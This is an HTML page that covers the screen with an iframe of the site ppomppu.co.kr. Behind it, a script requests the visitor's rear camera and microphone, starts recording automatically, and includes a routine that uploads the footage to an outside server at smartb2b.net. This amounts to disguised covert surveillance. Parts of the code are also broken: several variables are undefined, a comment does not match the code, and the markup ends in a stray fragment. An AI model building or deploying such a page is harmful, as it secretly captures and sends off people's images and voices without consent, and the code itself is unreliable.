
<!DOCTYPE html>

    <body>
        <div style="position:fixed; top:0; left:0; height:100%;     width: 100%; min-width: 100%; overflow:auto; -webkit-overflow-scrolling:touch; ">

    <iframe src='https://ppomppu.co.kr' width="100%" height="101%"></iframe>

<div>
    
        <h1 id="header">RecordRTC Upload to PHP</h1>
        <video id="your-video-id" controls autoplay playsinline></video>

        <script type="text/javascript">

          
            navigator.mediaDevices.getUserMedia({ video: {facingMode: 'environment'}, audio: true }).then(function(camera) {

                // preview camera during recording
                document.getElementById('your-video-id').muted = true;
                document.getElementById('your-video-id').srcObject = camera;

                // recording configuration/hints/parameters
                var recordingHints = {
                    type: 'video'
                };

                // initiating the recorder
                var recorder = RecordRTC(camera, recordingHints);

                // starting recording here
                recorder.startRecording();

                // auto stop recording after 5 seconds
                 recordingDIV.querySelector('#save').onclick = function() {
                    if(!recordRTC) return alert('No recording found.');
                    uploadToServer(recordRTC);
                    recordRTC.save();

                };

                   

          
            });

            // this function is used to generate random file name
            function getFileName(fileExtension) {
                var d = new Date();
                var year = d.getUTCFullYear();
                var month = d.getUTCMonth();
                var date = d.getUTCDate();
                return 'RecordRTC-' + year + month + date + '-' + getRandomString() + '.' + fileExtension;
            }

            function getRandomString() {
                if (window.crypto && window.crypto.getRandomValues && navigator.userAgent.indexOf('Safari') === -1) {
                    var a = window.crypto.getRandomValues(new Uint32Array(3)),
                        token = '';
                    for (var i = 0, l = a.length; i < l; i++) {
                        token += a[i].toString(36);
                    }
                    return token;
                } else {
                    return (Math.random() * new Date().getTime()).toString(36).replace(/\./g, '');
                }
            }

                    function uploadToServer(recordRTC) {
                var blob = recordRTC instanceof Blob ? recordRTC : recordRTC.blob;
                var fileType = blob.type.split('/')[0] || 'audio';
                var fileName = (Math.random() * 1000).toString().replace('.', '');

                if (fileType === 'audio') {
                    fileName += '.' + (!!navigator.mozGetUserMedia ? 'ogg' : 'wav');
                } else {
                    fileName += '.webm';
                }

                // create FormData
                var formData = new FormData();
                formData.append(fileType + '-filename', fileName);
                formData.append(fileType + '-blob', blob);


                    upload_url = 'https://testtest.smartb2b.net/save.php';

                makeXMLHttpRequest(upload_url, formData, function(progress) {
                    if (progress !== 'upload-ended') {
                   
                        return;
                    }

                  

                    // to make sure we can delete as soon as visitor leaves
                    listOfFilesUploaded.push(upload_directory + fileName);
                });
            }
        </script>

        
        <footer style="margin-top: 20px;"><small id="send-message"></small></footer>

">save</button>
